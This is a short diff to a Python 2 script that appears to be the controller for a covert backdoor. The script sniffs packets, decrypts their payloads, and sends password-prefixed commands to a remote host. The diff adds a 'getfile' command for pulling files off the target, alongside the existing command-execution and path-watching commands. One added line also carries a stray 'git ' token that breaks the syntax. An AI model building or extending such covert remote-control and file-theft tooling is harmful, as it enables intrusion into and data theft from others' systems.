@@ -8,9 +8,9 @@ return_payload = ""
 
 def stp_filter(packet):
     #print("DEBUG: Entering stp_filter")
-    print("####################RESPONSE_START###################\n")
-    print decrypt(packet['Raw'].load)
-    print("####################RESPONSE_END#####################\n")
+    # print("####################RESPONSE_START###################\n")
+    # print decrypt(packet['Raw'].load)
+    # print("####################RESPONSE_END#####################\n")
     if packet.haslayer(Raw):
         if decrypt(packet['Raw'].load) == "finished":
             global return_payload
@@ -35,8 +35,11 @@ def main():
     while 1:
         command = raw_input("Command to send:")
         if command == 'watchfile':
-            watch_patch = raw_input("Path to watch:")
-            command = PASSWORD + "1" + watch_patch
+            watch_path = raw_input("Path to watch:")
+            command = PASSWORD + "1" + watch_path
+        elif command == 'getfile':
+            file_path = raw_input("File to get:")git 
+            command = PASSWORD + "2" + file_path
         else:
             command = PASSWORD +"0" + command
 
